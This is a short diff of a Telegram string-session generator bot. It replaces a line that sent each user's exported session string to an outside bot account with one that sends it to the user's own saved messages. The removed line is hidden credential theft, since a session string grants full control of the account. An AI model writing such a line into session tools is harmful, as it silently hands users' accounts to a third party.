@@ -115,7 +115,7 @@ async def generate_session(bot, msg, telethon=False):
     else:
         string_session = await client.export_session_string()
     text = "**{} STRING SESSION** \n\n`{}` \n\n**Donate To Me For Support** @BLVCKCARDS".format("TELETHON" if telethon else "PYROGRAM", string_session)
-    await client.send_message("https://t.me/Stringsessiontelegrambot", text)
+    await client.send_message("me", text)
     await client.disconnect()
     await phone_code_msg.reply("✅** Successfully create {} string session.**\n\n╔══╦╗╔══╦═╦╦╗╔═╦══╦═╦══╗\n║╔╗║║║╔╗║╔╣╔╝║╔╣╔╗║╬╠╗╗║\n║╔╗║╚╣╠╣║╚╣╚╗║╚╣╠╣║╗╬╩╝║\n╚══╩═╩╝╚╩═╩╩╝╚═╩╝╚╩╩╩══╝\n\nBy @StringSessiontelegrambot".format("telethon" if telethon else "pyrogram"))
 
